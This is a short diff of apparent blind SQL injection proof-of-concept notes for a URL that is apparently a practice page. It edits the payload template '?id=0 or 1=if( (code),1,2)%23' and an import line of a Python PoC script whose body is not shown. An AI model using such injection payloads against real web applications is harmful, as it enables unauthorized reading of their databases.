@@ -1,10 +1,10 @@
 http://root0x00.altervista.org/sqli/blind.php
 
-?id=0 or 1=if( (code),1,2)%23
+?id=0 or 1=if( (code),1,2) %23
 
 ===========================================================
 # POC :: python
-import requests, time
+import requests
 
 url = "http://root0x00.altervista.org/sqli/blind.php"
 
